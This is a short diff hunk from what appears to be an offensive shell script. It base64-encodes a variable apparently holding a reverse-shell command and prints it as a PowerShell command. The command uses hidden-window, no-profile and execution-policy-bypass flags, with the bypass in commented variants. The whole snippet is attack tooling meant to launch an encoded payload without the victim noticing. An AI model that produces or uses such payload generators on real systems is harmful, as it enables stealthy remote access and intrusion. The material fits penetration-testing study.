@@ -83,5 +83,6 @@ base64payload=$(echo -n "${rev}" \
     | iconv -fUTF-8 -tUTF-16LE \
     | base64 -w0)
 
-#printf "powershell -Enc %s\n" "${base64payload}"
+#printf "powershell -exec bypass -Enc %s\n" "${base64payload}"
+#printf "powershell -nop -w hidden -exec bypass -Enc %s\n" "${base64payload}"
 printf "powershell -nop -w hidden -Enc %s\n" "${base64payload}"
